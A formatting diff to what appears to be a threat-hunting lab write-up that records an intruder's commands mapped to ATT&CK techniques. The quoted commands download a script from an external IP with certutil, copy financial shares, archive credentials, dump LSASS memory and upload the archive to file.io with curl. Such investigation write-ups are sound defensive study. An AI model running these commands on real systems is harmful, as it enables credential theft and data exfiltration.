@@ -107,7 +107,7 @@ Technique: Hidden Files & Directories (T1564.001)
 
 12:58:24 AM
 
-Command: certutil -urlcache -f http://78.141.196.6:67331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
+Command: `certutil -urlcache -f http://78.141.196.6:67331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`
 
 Technique: Ingress Tool Transfer (T1105)
 
@@ -117,7 +117,7 @@ Device: azuki-fileserver01 — Account: fileadmin
 
 1:06:03 AM
 
-Command: xcopy C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y
+Command: `xcopy C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y`
 
 Technique: Automated Collection (T1119)
 
@@ -131,7 +131,7 @@ Technique: Credentials Harvesting (T1552)
 
 1:25:31 AM
 
-Command: tar -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
+Command: `tar -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`
 
 Technique: Archive Collected Data (T1560.001)
 
@@ -139,7 +139,7 @@ Technique: Archive Collected Data (T1560.001)
 
 ~2:24:47 AM
 
-Command: pd -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp
+Command: `pd -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`
 
 Output: lsass.dmp memory dump
 
@@ -149,7 +149,7 @@ Technique: OS Credential Dumping (T1003.001)
 
 2:06:08 AM
 
-Command: curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io
+Command: `curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`
 
 Technique: Exfiltration to Cloud Storage (T1567.002)
 
